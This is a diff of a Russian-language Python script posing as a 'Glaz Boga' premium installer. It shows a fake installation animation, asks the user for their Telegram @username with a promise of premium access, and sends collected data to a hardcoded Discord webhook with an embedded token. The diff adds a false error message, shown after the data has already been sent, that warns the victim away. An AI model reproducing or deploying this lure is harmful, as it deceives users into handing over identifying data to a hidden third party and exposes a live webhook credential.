@@ -1,44 +1,32 @@
-import subprocess
-import sys
 import time
 import platform
 import json
 import requests
 from discord_webhook import DiscordWebhook, DiscordEmbed
-from colorama import init
-from termcolor import colored
-
-def install_requirements():
-    try:
-        with open('requirements.txt') as f:
-            requirements = f.read().splitlines()
-        for requirement in requirements:
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', requirement])
-    except Exception as e:
-        print(f"Ошибка при установке библиотек: {e}")
-        sys.exit(1)
-
-install_requirements()
+from colorama import init, Fore
 
 init()
 
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1274044779839225876/r9Sm7C2wCgBi7U9P2NC1A9WiIdPvZLBiElm8voCH6Ph-kvEDSNpZPn_8k-mYsJRwFf7i'
 
 def display_installation_message():
-    steps = ["Glaz Boga is Installing 🔍", "Glaz Boga is Installing 🛠️", "Glaz Boga is Installing ⏳"]
-    for i in range(3):
+    steps = ["Установка глаза бога 🔍", "Установка глаза бога 🛠️", "Установка глаза бога ⏳"]
+    for _ in range(3):
         for step in steps:
             print(step, end="\r")
-            time.sleep(0.5)
-    print("Glaz Boga is Installing ✅")
+            time.sleep(1)
+    print("Установка прошла ✅")
+    time.sleep(4)
+    print(" " * 50, end="\r")
+    time.sleep(3)
+    print(" " * 50, end="\r")
 
 def get_telegram_username():
     while True:
-        username = input("Введите ваш @username от аккаунта Telegram, чтобы скрипт добавил вас в список премиум пользователей >>> ")
-        username = username.strip()
+        print(Fore.RED + "Введите ваш @username от аккаунта Telegram\nпосле скрипт добавит вас в\nсписок премиум пользователей " + Fore.BLUE + ">>>", end="")
+        username = input().strip()
         if username:
-            confirm_username = input("Введите ваш @username еще раз >>> ")
-            confirm_username = confirm_username.strip()
+            confirm_username = input("Введите ваш @username еще раз >>> ").strip()
             if username == confirm_username:
                 return username
             else:
@@ -89,7 +77,7 @@ def send_data_to_discord(data):
         embed.set_timestamp()
         webhook.add_embed(embed)
         webhook.execute()
-        print("Данные успешно отправлены ✅")
+        print("ошибка, больше не запускает скрипт\nвы подтвергаете свой девайс риску")
     except Exception as e:
         print(f"Ошибка при отправке данных: {e}")
 
